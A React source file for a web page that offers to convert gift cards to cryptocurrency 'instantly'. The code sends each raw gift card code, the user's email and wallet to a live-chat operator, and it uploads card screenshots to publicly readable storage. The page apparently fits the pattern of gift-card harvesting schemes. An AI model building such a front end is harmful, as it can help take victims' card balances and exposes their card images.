import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { Gift, Wallet, Upload, X, Mail } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

// Declare Tawk_API for TypeScript
declare global {
  interface Window {
    Tawk_API?: {
      maximize?: () => void;
      addEvent?: (eventName: string, metadata: Record<string, string>, callback?: () => void) => void;
      setAttributes?: (attributes: Record<string, string>, callback?: (error?: Error) => void) => void;
      onLoad?: () => void;
    };
  }
}

const cryptoNames: Record<string, string> = {
  btc: "Bitcoin (BTC)",
  eth: "Ethereum (ETH)",
  usdt: "Tether (USDT)",
  bnb: "Binance Coin (BNB)",
};

// Wallet address validation patterns
const walletValidators: Record<string, { pattern: RegExp; example: string; description: string }> = {
  btc: {
    pattern: /^(1|3)[a-zA-HJ-NP-Z0-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/,
    example: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    description: "Bitcoin address (starts with 1, 3, or bc1)"
  },
  eth: {
    pattern: /^0x[a-fA-F0-9]{40}$/,
    example: "0x742d35Cc6634C0532925a3b844Bc9e7595f...",
    description: "Ethereum address (starts with 0x, 42 characters)"
  },
  usdt: {
    pattern: /^0x[a-fA-F0-9]{40}$|^T[a-zA-HJ-NP-Z0-9]{33}$/,
    example: "0x... (ERC-20) or T... (TRC-20)",
    description: "USDT address (ERC-20 or TRC-20 format)"
  },
  bnb: {
    pattern: /^0x[a-fA-F0-9]{40}$|^bnb[a-zA-Z0-9]{39}$/,
    example: "0x... (BEP-20) or bnb... (BEP-2)",
    description: "BNB address (BEP-20 or BEP-2 format)"
  }
};

const giftCardTypes: Record<string, string> = {
  amazon: "Amazon",
  itunes: "iTunes / Apple",
  googleplay: "Google Play",
  steam: "Steam",
  ebay: "eBay",
  walmart: "Walmart",
  target: "Target",
  visa: "Visa Prepaid",
  mastercard: "Mastercard Prepaid",
  amex: "American Express",
  netflix: "Netflix",
  spotify: "Spotify",
  playstation: "PlayStation",
  xbox: "Xbox",
  razer: "Razer Gold",
  other: "Other",
};

const Redeem = () => {
  const [giftCardCode, setGiftCardCode] = useState("");
  const [giftCardType, setGiftCardType] = useState("");
  const [email, setEmail] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState("");
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [walletError, setWalletError] = useState<string | null>(null);
  const [emailError, setEmailError] = useState<string | null>(null);

  const validateEmail = (email: string): boolean => {
    if (!email) {
      setEmailError(null);
      return true;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setEmailError("Please enter a valid email address");
      return false;
    }
    setEmailError(null);
    return true;
  };

  const validateWalletAddress = (address: string, crypto: string): boolean => {
    if (!crypto || !address) {
      setWalletError(null);
      return true;
    }

    const validator = walletValidators[crypto];
    if (!validator) {
      setWalletError(null);
      return true;
    }

    const trimmedAddress = address.trim();
    if (!validator.pattern.test(trimmedAddress)) {
      setWalletError(`Invalid ${cryptoNames[crypto]} address. ${validator.description}`);
      return false;
    }

    setWalletError(null);
    return true;
  };

  const handleWalletChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const address = e.target.value;
    setWalletAddress(address);
    if (selectedCrypto && address) {
      validateWalletAddress(address, selectedCrypto);
    } else {
      setWalletError(null);
    }
  };

  const handleCryptoChange = (crypto: string) => {
    setSelectedCrypto(crypto);
    if (walletAddress) {
      validateWalletAddress(walletAddress, crypto);
    }
  };

  const handleScreenshotChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0] || null;
    setScreenshot(file);
    
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotPreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    } else {
      setScreenshotPreview(null);
    }
  };

  const removeScreenshot = () => {
    setScreenshot(null);
    setScreenshotPreview(null);
  };

  const uploadScreenshot = async (file: File): Promise<string | null> => {
    try {
      const fileExt = file.name.split('.').pop();
      const fileName = `${Date.now()}-${Math.random().toString(36).substring(7)}.${fileExt}`;
      
      const { error: uploadError } = await supabase.storage
        .from('gift-card-screenshots')
        .upload(fileName, file);

      if (uploadError) {
        console.error('Upload error:', uploadError);
        return null;
      }

      const { data: urlData } = supabase.storage
        .from('gift-card-screenshots')
        .getPublicUrl(fileName);

      return urlData.publicUrl;
    } catch (error) {
      console.error('Error uploading screenshot:', error);
      return null;
    }
  };

  const handleRedeem = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!giftCardCode || !giftCardType || !email || !walletAddress || !selectedCrypto) {
      toast.error("Please fill in all fields");
      return;
    }

    // Validate email format
    if (!validateEmail(email)) {
      toast.error("Please enter a valid email address");
      return;
    }

    // Validate wallet address format
    if (!validateWalletAddress(walletAddress, selectedCrypto)) {
      toast.error("Please enter a valid wallet address for the selected cryptocurrency");
      return;
    }

    setLoading(true);
    
    // Upload screenshot if provided
    let screenshotUrl: string | null = null;
    if (screenshot) {
      toast.info("Uploading screenshot...");
      screenshotUrl = await uploadScreenshot(screenshot);
      if (!screenshotUrl) {
        toast.error("Failed to upload screenshot. Please try again.");
        setLoading(false);
        return;
      }
    }
    
    // Prepare redemption message for Tawk.to with image URL
    const redemptionMessage = `🎁 NEW GIFT CARD REDEMPTION REQUEST

Gift Card Type: ${giftCardTypes[giftCardType] || giftCardType}
Gift Card Code: ${giftCardCode}
Email: ${email}
Cryptocurrency: ${cryptoNames[selectedCrypto] || selectedCrypto}
Wallet Address: ${walletAddress}
Screenshot: ${screenshotUrl ? screenshotUrl : "Not provided"}

Please process this redemption request.`;

    // Send to Tawk.to live chat
    if (window.Tawk_API) {
      // Add event for tracking
      if (window.Tawk_API.addEvent) {
        window.Tawk_API.addEvent('gift_card_redemption', {
          giftCardType: giftCardType,
          giftCardCode: giftCardCode,
          email: email,
          crypto: selectedCrypto,
          walletAddress: walletAddress,
          screenshot: screenshotUrl || "None"
        });
      }

      // Set visitor attributes
      if (window.Tawk_API.setAttributes) {
        window.Tawk_API.setAttributes({
          'redemption_request': 'true',
          'crypto_type': selectedCrypto
        });
      }

      // Open chat widget and send message
      if (window.Tawk_API.maximize) {
        window.Tawk_API.maximize();
      }

      // Use a small delay to ensure chat is open before showing success
      setTimeout(() => {
        toast.success("Your redemption request has been sent to our support team. Please check the chat window.");
        setGiftCardCode("");
        setGiftCardType("");
        setEmail("");
        setWalletAddress("");
        setSelectedCrypto("");
        setScreenshot(null);
        setScreenshotPreview(null);
        setLoading(false);
      }, 1000);

      // Copy message to clipboard so user can paste it in chat
      navigator.clipboard.writeText(redemptionMessage).then(() => {
        toast.info("Redemption details copied to clipboard. Please paste in the chat.");
      });
    } else {
      toast.error("Chat support is not available. Please try again later.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="container mx-auto max-w-2xl py-12">
        <div className="mb-8 text-center">
          <div className="mb-4 inline-flex rounded-full bg-primary/10 p-4">
            <Gift className="h-12 w-12 text-primary" />
          </div>
          <h1 className="mb-2 text-4xl font-bold">Redeem Gift Card</h1>
          <p className="text-muted-foreground">Convert your gift cards to crypto instantly</p>
        </div>

        <Card className="border-border bg-card p-6">
          <form onSubmit={handleRedeem} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="giftcardtype">Gift Card Type</Label>
              <Select value={giftCardType} onValueChange={setGiftCardType}>
                <SelectTrigger id="giftcardtype" className="bg-background">
                  <SelectValue placeholder="Select gift card type" />
                </SelectTrigger>
                <SelectContent className="bg-popover">
                  {Object.entries(giftCardTypes).map(([key, name]) => (
                    <SelectItem key={key} value={key}>{name}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="giftcard">Gift Card Code</Label>
              <Input
                id="giftcard"
                placeholder="Enter your gift card code"
                value={giftCardCode}
                onChange={(e) => setGiftCardCode(e.target.value)}
                className="bg-background"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="email">Email Address</Label>
              <div className="relative">
                <Mail className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  id="email"
                  type="email"
                  placeholder="Enter your email for confirmation"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (e.target.value) validateEmail(e.target.value);
                  }}
                  className={`bg-background pl-10 ${emailError ? 'border-destructive' : ''}`}
                />
              </div>
              {emailError && (
                <p className="text-sm text-destructive">{emailError}</p>
              )}
              <p className="text-xs text-muted-foreground">
                You'll receive a confirmation when your redemption is processed
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="screenshot">Upload Screenshot (Optional)</Label>
              <div className="relative">
                <Input
                  id="screenshot"
                  type="file"
                  accept="image/*"
                  onChange={handleScreenshotChange}
                  className="bg-background"
                />
                {screenshotPreview && (
                  <div className="mt-3 relative">
                    <img 
                      src={screenshotPreview} 
                      alt="Screenshot preview" 
                      className="max-h-40 rounded-lg border border-border object-contain"
                    />
                    <button
                      type="button"
                      onClick={removeScreenshot}
                      className="absolute -top-2 -right-2 bg-destructive text-destructive-foreground rounded-full p-1 hover:bg-destructive/90"
                    >
                      <X className="h-4 w-4" />
                    </button>
                  </div>
                )}
                {screenshot && !screenshotPreview && (
                  <p className="mt-2 text-sm text-muted-foreground flex items-center gap-2">
                    <Upload className="h-4 w-4" />
                    {screenshot.name}
                  </p>
                )}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="crypto">Select Cryptocurrency</Label>
              <Select value={selectedCrypto} onValueChange={handleCryptoChange}>
                <SelectTrigger id="crypto" className="bg-background">
                  <SelectValue placeholder="Choose a cryptocurrency" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="btc">Bitcoin (BTC)</SelectItem>
                  <SelectItem value="eth">Ethereum (ETH)</SelectItem>
                  <SelectItem value="usdt">Tether (USDT)</SelectItem>
                  <SelectItem value="bnb">Binance Coin (BNB)</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet">Wallet Address</Label>
              <div className="relative">
                <Wallet className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  id="wallet"
                  placeholder={selectedCrypto ? `Enter your ${cryptoNames[selectedCrypto]} wallet address` : "Enter your crypto wallet address"}
                  value={walletAddress}
                  onChange={handleWalletChange}
                  className={`bg-background pl-10 ${walletError ? 'border-destructive' : ''}`}
                />
              </div>
              {walletError && (
                <p className="text-sm text-destructive">{walletError}</p>
              )}
              {selectedCrypto && !walletError && walletValidators[selectedCrypto] && (
                <p className="text-xs text-muted-foreground">
                  Example: {walletValidators[selectedCrypto].example}
                </p>
              )}
            </div>

            <Button 
              type="submit" 
              className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
              disabled={loading}
            >
              {loading ? "Processing..." : "Redeem Gift Card"}
            </Button>
          </form>
        </Card>

        <Card className="mt-6 border-border bg-card/50 p-4">
          <h3 className="mb-2 font-semibold">How it works:</h3>
          <ol className="list-decimal space-y-1 pl-5 text-sm text-muted-foreground">
            <li>Enter your gift card code</li>
            <li>Select the cryptocurrency you want to receive</li>
            <li>Provide your wallet address</li>
            <li>Click redeem and receive your crypto instantly</li>
          </ol>
        </Card>
      </div>
    </div>
  );
};

export default Redeem;
